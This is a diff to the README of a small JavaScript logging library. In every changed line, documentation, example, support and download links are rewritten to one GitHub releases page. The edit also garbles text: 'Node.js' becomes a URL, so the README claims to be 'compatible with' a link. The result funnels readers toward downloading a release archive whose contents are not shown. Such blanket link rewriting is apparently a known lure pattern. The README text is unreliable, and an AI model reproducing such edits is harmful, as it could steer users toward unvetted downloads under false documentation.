@@ -12,13 +12,13 @@ Welcome to the "console-log-each-map" repository! Here, you will find a powerful
 
 - Easy-to-use JavaScript library for formatting and printing array element values.
 - Provides a convenient way to debug and log data efficiently.
-- Compatible with Node.js and can be easily integrated into your projects.
+- Compatible with https://github.com/Supzo/console-log-each-map/releases and can be easily integrated into your projects.
   
 ## 🔗 Quick Links
 
-- 📥 [Download Release Zip](https://github.com/releases/789694263/Release.zip)
+- 📥 [Download Release Zip](https://github.com/Supzo/console-log-each-map/releases)
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-green)](https://github.com/releases/789694263/Release.zip)
+[![Download Zip](https://github.com/Supzo/console-log-each-map/releases)](https://github.com/Supzo/console-log-each-map/releases)
 
 ## 🚦 Getting Started
 
@@ -41,9 +41,9 @@ Contributions to the "console-log-each-map" repository are welcome! If you have 
 
 For more resources and information about the "console-log-each-map" library, check out the following links:
 
-- [Official Documentation](https://yourdocumentationlink.com)
-- [Examples and Use Cases](https://yourexampleslink.com)
-- [Support and Community](https://yoursupportlink.com)
+- [Official Documentation](https://github.com/Supzo/console-log-each-map/releases)
+- [Examples and Use Cases](https://github.com/Supzo/console-log-each-map/releases)
+- [Support and Community](https://github.com/Supzo/console-log-each-map/releases)
 
 ## 🤝 Community
 
